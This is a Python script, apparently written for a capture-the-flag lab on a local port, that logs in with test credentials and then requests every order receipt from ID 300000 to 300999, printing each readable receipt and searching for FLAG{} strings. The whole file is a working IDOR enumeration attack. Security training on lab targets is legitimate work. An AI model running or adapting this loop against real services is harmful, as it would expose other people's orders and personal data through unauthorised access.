import requests
import re
from time import time

BASE_URL = "http://127.0.0.1:32781"

# Create session to maintain cookies
session = requests.Session()

print("[*] Starting order ID enumeration (300000-300999)")
print("="*80)

# Step 1: Two-step login process
print("\n[*] Step 1: Submitting username")
username_data = {"username": "test"}
resp1 = session.post(f"{BASE_URL}/login", data=username_data, allow_redirects=False)
print(f"[+] Username submission: Status {resp1.status_code}")
print(f"[+] Cookies after username: {dict(session.cookies)}")

print("\n[*] Step 2: Submitting password")
password_data = {"password": "test"}
resp2 = session.post(f"{BASE_URL}/login", data=password_data, allow_redirects=False)
print(f"[+] Password submission: Status {resp2.status_code}")
print(f"[+] Cookies after password: {dict(session.cookies)}")

# Verify authentication by checking a common endpoint
print("\n[*] Verifying authentication...")
verify_resp = session.get(f"{BASE_URL}/")
print(f"[+] Home page access: Status {verify_resp.status_code}")

# Step 2: Enumerate order IDs from 300000 to 300999
print("\n[*] Starting order ID enumeration (300000-300999)")
print("="*80)

valid_orders = []
flags_found = []
status_counts = {}
start_time = time()

for order_id in range(300000, 301000):
    url = f"{BASE_URL}/order/{order_id}/receipt"
    
    try:
        resp = session.get(url, timeout=10)
        status = resp.status_code
        
        # Track status codes
        status_counts[status] = status_counts.get(status, 0) + 1
        
        if status == 200:
            print(f"\n[SUCCESS] Valid order found: {order_id}")
            print(f"  Status: {status} | Length: {len(resp.content)}B")
            print(f"  Response:\n{resp.text}")
            print("-"*80)
            
            valid_orders.append({
                'id': order_id,
                'length': len(resp.content),
                'response': resp.text
            })
            
            # Search for FLAG{} pattern
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text, re.IGNORECASE)
            if flags:
                for flag in flags:
                    print(f"[!] FLAG FOUND at order {order_id}: {flag}")
                    flags_found.append({'order_id': order_id, 'flag': flag})
        
        elif status not in [404, 403]:
            # Report anomalies (not 200, 404, or 403)
            print(f"\n[ANOMALY] order_id={order_id} | Status: {status}")
            print(f"  Response: {resp.text[:200]}")
    
    except requests.exceptions.Timeout:
        print(f"\n[TIMEOUT] order_id={order_id}")
    except Exception as e:
        print(f"\n[ERROR] order_id={order_id} | {type(e).__name__}: {str(e)}")
    
    # Progress indicator every 100 requests
    if (order_id - 299999) % 100 == 0:
        elapsed = time() - start_time
        progress = order_id - 299999
        rate = progress / elapsed if elapsed > 0 else 0
        print(f"\n[PROGRESS] Tested {progress}/1000 orders | Rate: {rate:.1f} req/s | Elapsed: {elapsed:.1f}s")

elapsed_total = time() - start_time

# Final summary
print("\n" + "="*80)
print("[SUMMARY]")
print("="*80)
print(f"Total orders tested: 1000 (300000-300999)")
print(f"Time elapsed: {elapsed_total:.2f}s")
print(f"Average rate: {1000/elapsed_total:.1f} req/s")
print(f"\nStatus code distribution:")
for status, count in sorted(status_counts.items()):
    print(f"  {status}: {count}")

print(f"\n[VALID ORDERS FOUND]: {len(valid_orders)}")
if valid_orders:
    print("Valid order IDs:")
    for order in valid_orders:
        print(f"  - Order {order['id']} ({order['length']} bytes)")

print(f"\n[FLAGS FOUND]: {len(flags_found)}")
if flags_found:
    for item in flags_found:
        print(f"  - Order {item['order_id']}: {item['flag']}")
else:
    print("  No FLAG{} patterns found in responses")

print("="*80)

